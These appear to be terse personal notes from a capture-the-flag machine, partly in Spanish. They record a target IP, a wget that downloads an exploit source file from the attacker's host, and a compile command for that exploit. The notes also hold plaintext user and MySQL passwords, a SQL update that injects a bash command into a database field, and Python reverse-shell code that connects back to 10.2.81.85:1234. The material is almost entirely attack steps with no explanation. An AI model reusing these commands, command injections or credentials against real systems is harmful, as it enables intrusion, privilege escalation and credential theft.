10.10.216.126
22
80
	/app 
	password
	
	
	
find / -type f -name .placeholder 2>/dev/null

wget http://10.2.81.85:1337/exploita.c

gcc exploita.c -o exploit -lmnl -lnftnl -no-pie -lpthread

lucien:HeyLucien#@1999!

death:!mementoMORI666!

mysql -u lucien -plucien42DBPASSWORD
0>&1

UPDATE dreams
SET dream = ';/bin/bash -i' 
WHERE dreamer = 'Alice';

psy64 > morpheus ejecuta comando cada ciertos minutos
revshell para shutil
nc una vez modificado a la espera de que morfeo ejecute

BASH HYSTORY LUCIEN

lucien:HeyLucien#@1999!

death:!mementoMORI666!

import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.2.81.85",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

import pty
pty.spawn("bash")